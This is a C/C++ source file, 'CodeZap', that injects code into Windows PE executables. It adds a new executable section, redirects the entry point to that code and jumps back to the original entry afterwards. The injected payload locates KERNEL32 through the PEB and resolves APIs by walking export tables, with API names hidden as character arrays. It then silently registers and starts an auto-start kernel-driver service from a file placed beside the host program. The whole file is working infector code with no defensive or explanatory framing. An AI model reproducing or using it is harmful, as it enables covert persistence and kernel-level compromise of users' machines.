


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Header
#include "MemFile.h"
#include "PEB.h"

#ifdef _UNICODE
#define ZEND 'W', 0
#else
#define ZEND 'A', 0
#endif

#define ZAPI __forceinline
#define ZALIGN(x, a) (((x - 1) / a + 1) * a)
#define ZREV(x) ((((DWORD) (x) & 0xFF) << 24) | (((DWORD) (x) & 0xFF00) << 8) | (((DWORD) (x) & 0xFF0000) >> 8) | (((DWORD) (x) & 0xFF000000) >> 24))
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// KERNEL32
typedef HMODULE (WINAPI *PLoadLibrary)(PCTSTR ptzPath);
typedef FARPROC (WINAPI *PGetProcAddress)(HMODULE hModule, PCSTR pszName);
typedef DWORD (WINAPI *PGetModuleFileName)(HMODULE hModule, PTSTR ptzPath, DWORD dwSize);

// USER32
typedef INT (WINAPI *PMessageBox)(HWND hWnd, PCTSTR ptzText, PCTSTR ptzCaption, UINT uType);

// ADAVAPI32
typedef BOOL (WINAPI *PCloseServiceHandle)(SC_HANDLE hSCObject);
typedef BOOL (WINAPI *PDeleteService)(SC_HANDLE hSCObject);
typedef BOOL (WINAPI *PQueryServiceStatus)(SC_HANDLE hService, LPSERVICE_STATUS lpServiceStatus);
typedef BOOL (WINAPI *PControlService)(SC_HANDLE hService, DWORD dwControl, LPSERVICE_STATUS lpServiceStatus);
typedef SC_HANDLE (WINAPI *POpenSCManager)(PCTSTR ptzMachine, PCTSTR ptzDatabase, DWORD dwAccess);
typedef BOOL (WINAPI *PStartService)(SC_HANDLE hService, DWORD dwNumServiceArgs, PCTSTR *ptzServiceArgVectors);
typedef SC_HANDLE (WINAPI *POpenService)(SC_HANDLE hSCManager, PCTSTR ptzServiceName, DWORD dwDesiredAccess);
typedef SC_HANDLE (WINAPI *PCreateService)(SC_HANDLE hSCManager, PCTSTR ptzServiceName, PCTSTR ptzDisplayName,
										   DWORD dwDesiredAccess, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl,
										   PCTSTR ptzBinaryPathName, PCTSTR ptzLoadOrderGroup, LPDWORD ptzdwTagId, PCTSTR ptzDependencies,
										   PCTSTR ptzServiceStartName, PCTSTR ptzPassword);
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// CodeZap
BOOL CodeZap(PCTSTR ptzDst, PCTSTR ptzSrc, PVOID pvCode)
{
	// Fix JMP to function in DEBUG version
	PBYTE pbCode = (PBYTE) pvCode;
	if (*pbCode == 0xE9)
	{
		pbCode += *(PDWORD) (pbCode + 1) + 5;
	}

	// Search JMP OEP magic
	UINT uEntry = 0;
	while ((pbCode[uEntry++] != 0xE9) || (*((PDWORD) (pbCode + uEntry)) != 0x00000000));
	uEntry += 4;

	// Search RET/0xC3, end of function
	UINT uCode = uEntry;
	while (pbCode[uCode++] != 0xC3);

	// Open source file
	CMemFile fSrc(ptzSrc);
	if (!fSrc)
	{
		return FALSE;
	}

	// Verify DOS signature
	PBYTE pbSrc = fSrc;
	if (((PIMAGE_DOS_HEADER) pbSrc)->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return FALSE;
	}

	// Verify PE signature
	PIMAGE_NT_HEADERS pNTHdr = (PIMAGE_NT_HEADERS) (pbSrc + ((PIMAGE_DOS_HEADER) pbSrc)->e_lfanew);
	if (pNTHdr->Signature != IMAGE_NT_SIGNATURE)
	{
		return FALSE;
	}

	// Verify sections header space
	if ((pNTHdr->FileHeader.NumberOfSections + 1) * sizeof(IMAGE_SECTION_HEADER) > pNTHdr->OptionalHeader.SizeOfHeaders)
	{
		return FALSE;
	}

	// Calculate code and file delta
	DWORD uCodeDelta = ZALIGN(uCode, pNTHdr->OptionalHeader.SectionAlignment);
	DWORD dwFileDelta = ZALIGN(uCode, pNTHdr->OptionalHeader.FileAlignment);

	// Open destination file
	CMemFile fDst(ptzDst, FALSE, (DWORD) fSrc + dwFileDelta);
	if (!fDst)
	{
		return FALSE;
	}

	// Copy source to destination
	PBYTE pbDst = fDst;
	memcpy(pbDst, pbSrc, fSrc);

	// Get IMAGE_NT_HEADERS, new section header and last section header on destination
	PIMAGE_NT_HEADERS qNTHdr = (PIMAGE_NT_HEADERS) (pbDst + ((PIMAGE_DOS_HEADER) pbDst)->e_lfanew);
	PIMAGE_SECTION_HEADER pNewSec = (PIMAGE_SECTION_HEADER) (qNTHdr + 1) + pNTHdr->FileHeader.NumberOfSections;
	PIMAGE_SECTION_HEADER pLastSec = pNewSec - 1;

	// Fill new section header
	memcpy(pNewSec->Name, ".ZCode", 7);
	pNewSec->VirtualAddress = pLastSec->VirtualAddress + ZALIGN(pLastSec->Misc.VirtualSize, pNTHdr->OptionalHeader.SectionAlignment);
	pNewSec->PointerToRawData = pLastSec->PointerToRawData + pLastSec->SizeOfRawData;
	pNewSec->Misc.VirtualSize = uCode;
	pNewSec->SizeOfRawData = uCodeDelta;
	pNewSec->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE;

	// Modify IMAGE_NT_HEADERS
	qNTHdr->FileHeader.NumberOfSections++;
	qNTHdr->OptionalHeader.SizeOfCode += uCodeDelta;
	qNTHdr->OptionalHeader.SizeOfImage += dwFileDelta;
	qNTHdr->OptionalHeader.AddressOfEntryPoint = pNewSec->VirtualAddress + uEntry;
	qNTHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = 0;
	qNTHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = 0;

	// Copy code
	pbDst += fSrc;
	memcpy(pbDst, pbCode, uCode);

	// Fix JMP delta to OEP
	pbDst += uEntry - 4;
	*((PDWORD) pbDst) = pNTHdr->OptionalHeader.AddressOfEntryPoint - (pNewSec->VirtualAddress + uEntry);

	//memset(pbDst + uCodeEx, 0xFF, dwFileDelta - uCode);
	return TRUE;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Match string. Both ASCII and UNICODE string are accepted
template <typename T1, typename T2>
ZAPI BOOL ZStrMatch(const T1* ptzStr1, const T2* ptzStr2)
{
	for (UINT i = 0; ptzStr1[i]; i++)
	{
		if (ptzStr1[i] != ptzStr2[i])
		{
			return FALSE;
		}
	}
	return TRUE;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Get KERNEL32 base address from PEB
ZAPI HMODULE ZGetKernelHandle()
{
	PPEB pPeb;
	__asm MOV EAX, FS:[0x30];
	__asm MOV pPeb, EAX;
	HMODULE** h = (HMODULE**) pPeb->LoaderData->InInitializationOrderModuleList.Flink;
	return (*h)[2];
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Lookup module base address from PEB
ZAPI HMODULE ZGetModuleHandle(PCTSTR ptzModule = NULL)
{
	PPEB pPeb;
	__asm MOV EAX, FS:[0x30];
	__asm MOV pPeb, EAX;

	PLDR_MODULE pFirst = (PLDR_MODULE) pPeb->LoaderData->InLoadOrderModuleList.Flink;
	if (!ptzModule)
	{
		return (HMODULE) pFirst->BaseAddress;
	}

	PLDR_MODULE p = pFirst;
	do
	{
		if (ZStrMatch(ptzModule, p->BaseDllName.Buffer))
		{
			return (HMODULE) p->BaseAddress;
		}
		p = (PLDR_MODULE) p->InLoadOrderModuleList.Flink;
	}
	while (p != pFirst);

	return NULL;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Search module base address
// DEPRECATED: Use ZGetModuleHandle instead
#ifdef ZFORCE
ZAPI HMODULE ZSearchModuleHandle(PCTSTR ptzModule, PBYTE pbBase = (PBYTE) 0x70000000, PBYTE pbMax = (PBYTE) 0x80000000)
{
__Retry:
	__try
	{
		while (pbBase < pbMax)
		{
			if (((PIMAGE_DOS_HEADER) pbBase)->e_magic == IMAGE_DOS_SIGNATURE)
			{
				PIMAGE_NT_HEADERS pNTHdr = (PIMAGE_NT_HEADERS) (pbBase + ((PIMAGE_DOS_HEADER) pbBase)->e_lfanew);
				if (pNTHdr->Signature == IMAGE_NT_SIGNATURE)
				{
					DWORD dwExpVA = pNTHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
					PIMAGE_EXPORT_DIRECTORY pExpDir = (PIMAGE_EXPORT_DIRECTORY) (pbBase + dwExpVA);
					PCSTR pszName = (PCSTR) (pbBase + pExpDir->Name);
					if (ZStrMatch(ptzModule, pszName))
					{
						return (HMODULE) pbBase;
					}
				}
			}
			pbBase += 0x1000;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		pbBase += 0x1000;
		goto __Retry;
	}
	return NULL;
}
#endif
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Lookup function address
ZAPI FARPROC ZGetProcAddress(HMODULE hModule, PCTSTR ptzProc)
{
	// Verify DOS signature
	PBYTE pbBase = (PBYTE) hModule;
	if (((PIMAGE_DOS_HEADER) pbBase)->e_magic == IMAGE_DOS_SIGNATURE)
	{
		// Verify PE signature
		PIMAGE_NT_HEADERS pNTHdr = (PIMAGE_NT_HEADERS) (pbBase + ((PIMAGE_DOS_HEADER) pbBase)->e_lfanew);
		if (pNTHdr->Signature == IMAGE_NT_SIGNATURE)
		{
			// Lookup export table
			DWORD dwExpVA = pNTHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
			PIMAGE_EXPORT_DIRECTORY pExpDir = (PIMAGE_EXPORT_DIRECTORY) (pbBase + dwExpVA);
			PDWORD pdwNames = (PDWORD) (pbBase + pExpDir->AddressOfNames);
			for (UINT i = 0; i < pExpDir->NumberOfNames; i++)
			{
				PCSTR pszName = (PCSTR) (pbBase + pdwNames[i]);
				if (pszName && ZStrMatch(ptzProc, pszName))
				{
					PWORD pdwOrdinals = (PWORD) (pbBase + pExpDir->AddressOfNameOrdinals);
					PDWORD pdwFunctions = (PDWORD) (pbBase + pExpDir->AddressOfFunctions);
					return (FARPROC) (pbBase + pdwFunctions[pdwOrdinals[i]]);
				}
			}
		}
	}
	return NULL;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ZCode
VOID CDECL ZCode(BOOL bCreate)
{
	__asm
	{
#define ZERO8 __asm _EMIT 0 __asm _EMIT 0 __asm _EMIT 0 __asm _EMIT 0 __asm _EMIT 0 __asm _EMIT 0 __asm _EMIT 0 __asm _EMIT 0
#define ZERO80 ZERO8 ZERO8 ZERO8 ZERO8 ZERO8 ZERO8 ZERO8 ZERO8
#define ZERO800 ZERO80 ZERO80 ZERO80 ZERO80 ZERO80 ZERO80 ZERO80 ZERO80
#define ZERO8000 ZERO800 ZERO800 ZERO800 ZERO800 ZERO800 ZERO800 ZERO800 ZERO800
		JMP	_PadEnd;
		ZERO8000 ZERO8000
_PadEnd:
	}
	// KERNEL32
	HMODULE hKernel32 = ZGetKernelHandle();

	// GetProcAddress
	TCHAR szGetProcAddress[] = {'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0};
	PGetProcAddress pGetProcAddress = (PGetProcAddress) ZGetProcAddress(hKernel32, szGetProcAddress);
	if (!pGetProcAddress) return;

	// LoadLibrary
	CHAR szLoadLibrary[] = {'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', ZEND};
	PLoadLibrary pLoadLibrary = (PLoadLibrary) pGetProcAddress(hKernel32, szLoadLibrary);
	if (!pLoadLibrary) return;

	TCHAR tzPath[MAX_PATH];
	CHAR szGetModuleFileName[] = {'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'F', 'i', 'l', 'e', 'N', 'a', 'm', 'e', ZEND};
	PGetModuleFileName pGetModuleFileName = (PGetModuleFileName) pGetProcAddress(hKernel32, szGetModuleFileName);

	TCHAR tzAdvapi32[] = {'A', 'D', 'V', 'A', 'P', 'I', '3', '2', 0};
	HMODULE hAdvapi32 = pLoadLibrary(tzAdvapi32);
	CHAR szCloseServiceHandle[] = {'C', 'l', 'o', 's', 'e', 'S', 'e', 'r', 'v', 'i', 'c', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0};
	CHAR szOpenSCManager[] = {'O', 'p', 'e', 'n', 'S', 'C', 'M', 'a', 'n', 'a', 'g', 'e', 'r', ZEND};
	CHAR szOpenService[] = {'O', 'p', 'e', 'n', 'S', 'e', 'r', 'v', 'i', 'c', 'e', ZEND};
	CHAR szStartService[] = {'S', 't', 'a', 'r', 't', 'S', 'e', 'r', 'v', 'i', 'c', 'e', ZEND};
	CHAR szDeleteService[] = {'D', 'e', 'l', 'e', 't', 'e', 'S', 'e', 'r', 'v', 'i', 'c', 'e', 0};
	CHAR szCreateService[] = {'C', 'r', 'e', 'a', 't', 'e', 'S', 'e', 'r', 'v', 'i', 'c', 'e', ZEND};
	CHAR szQueryServiceStatus[] = {'Q', 'u', 'e', 'r', 'y', 'S', 'e', 'r', 'v', 'i', 'c', 'e', 'S', 't', 'a', 't', 'u', 's', 0};
	CHAR szControlService[] = {'C', 'o', 'n', 't', 'r', 'o', 'l', 'S', 'e', 'r', 'v', 'i', 'c', 'e', 0};

	PQueryServiceStatus pQueryServiceStatus = (PQueryServiceStatus) pGetProcAddress(hAdvapi32, szQueryServiceStatus);
	PControlService pControlService = (PControlService) pGetProcAddress(hAdvapi32, szControlService);
	PDeleteService pDeleteService = (PDeleteService) pGetProcAddress(hAdvapi32, szDeleteService);
	PCloseServiceHandle pCloseServiceHandle = (PCloseServiceHandle) pGetProcAddress(hAdvapi32, szCloseServiceHandle);
	POpenSCManager pOpenSCManager = (POpenSCManager) pGetProcAddress(hAdvapi32, szOpenSCManager);
	PStartService pStartService = (PStartService) pGetProcAddress(hAdvapi32, szStartService);
	POpenService pOpenService = (POpenService) pGetProcAddress(hAdvapi32, szOpenService);
	PCreateService pCreateService = (PCreateService) pGetProcAddress(hAdvapi32, szCreateService);

	if (!pGetModuleFileName || !pCloseServiceHandle || !pOpenSCManager ||
		!pStartService || !pOpenService || ! pDeleteService || !pCreateService ||
		!pQueryServiceStatus || !pControlService)
	{
		return;
	}

	pGetModuleFileName(NULL, tzPath, MAX_PATH);
	PTSTR p = tzPath;
	while (*p) p++;
	while (*p != '\\') p--;
	p[1] = 'V';
	p[2] = 'D';
	p[3] = 'D';
	p[4] = '-';
	p[5] = 'X';
	p[6] = '8';
	p[7] = '6';
	p[8] = '.';
	p[9] = 'S';
	p[10] = 'Y';
	p[11] = 'S';
	p[12] = 0;

#ifdef _DEBUG
	// USER32
	TCHAR tzUser32[] = {'U', 'S', 'E', 'R', '3', '2', 0};
	HMODULE hUser32 = pLoadLibrary(tzUser32);

	// MessageBox
	CHAR szMessageBox[] = {'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', ZEND};
	PMessageBox pMessageBox = (PMessageBox) pGetProcAddress(hUser32, szMessageBox);

	TCHAR tzCaption[] = {'H', 'a', 'h', 'a', ',', ' ', 'I', ' ', 'a', 'm', ' ', 'C', 'o', 'd', 'e', 'Z', 'a', 'p', '!', 0};
	pMessageBox(NULL, tzPath, tzCaption, MB_ICONINFORMATION);
#endif

	SC_HANDLE hManager = pOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hManager)
	{
		TCHAR tzName[] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'D', 'r', 'i', 'v', 'e', 0};
		if (bCreate)
		{
			SC_HANDLE hService = pCreateService(hManager, tzName, tzName,
				SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START,
				SERVICE_ERROR_IGNORE, tzPath, NULL, NULL, NULL, NULL, NULL);
			if (hService)
			{
				pStartService(hService, 0, NULL);
				pCloseServiceHandle(hService);
			}
		}
		else
		{
			SC_HANDLE hService = pOpenService(hManager, tzName, SERVICE_ALL_ACCESS | DELETE);
			if (hService)
			{
				SERVICE_STATUS ss;
				pQueryServiceStatus(hService, &ss);
				if (ss.dwCurrentState != SERVICE_STOPPED)
				{
					pControlService(hService, SERVICE_CONTROL_STOP, &ss);
				}
				pDeleteService(hService);
				pCloseServiceHandle(hService);
			}

		}

		pCloseServiceHandle(hManager);
	}

	__asm
	{
		JMP	_ZCodeEnd;

		PUSHAD;
		PUSH	FALSE;
		CALL	ZCode;
		ADD		ESP, 4;
		POPAD;

		MOV		[EBP - 0x1C], EAX;
		CMP		[EBP - 0x20], 0;
		RET
_ZJumpOEP:
		// Jump to OEP: Jump delta will be fixed by CodeZap
		JMP	$ + 5;

#ifndef _DEBUG
		// Put your own ASM code here
		PUSHAD;
		PUSH	TRUE;
		CALL	ZCode;
		ADD		ESP, 4

		POPAD;

#endif

		JMP		_ZJumpOEP;
_ZCodeEnd:
	}
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
